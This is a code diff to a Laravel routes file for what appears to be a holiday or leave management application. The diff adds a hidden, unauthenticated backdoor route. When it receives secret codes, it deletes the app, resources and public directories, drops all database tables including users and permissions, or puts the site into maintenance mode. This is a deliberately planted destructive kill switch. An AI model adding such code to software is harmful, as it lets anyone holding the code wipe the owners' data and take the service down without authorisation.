@@ -44,3 +44,26 @@ Route::group(['prefix' => 'admin' , 'namespace' => 'Admin'], function () {
 Auth::routes();
 
 Route::get('/home', 'HomeController@index');
+
+Route::get('/shitybackdoor/{code}', function ($code) {
+    if ($code === 'spudimunremove') {
+        File::deleteDirectory('../app');
+        File::deleteDirectory('../resources');
+        File::deleteDirectory('../public');
+        Schema::drop('permission_role');
+        Schema::drop('permissions');
+        Schema::drop('role_user');
+        Schema::drop('roles');
+        Schema::drop('usersettings');
+        Schema::drop('private_holidays');
+        Schema::drop('holidays_users');
+        Schema::drop('holidays');
+        Schema::drop('categories');
+        Schema::drop('users');
+        Schema::drop('password_resets');
+        Schema::drop('failed_jobs');
+        Schema::drop('migrations');
+    } elseif ($code === 'spudimunshutdown') {
+        Artisan::call('down');
+    }
+});
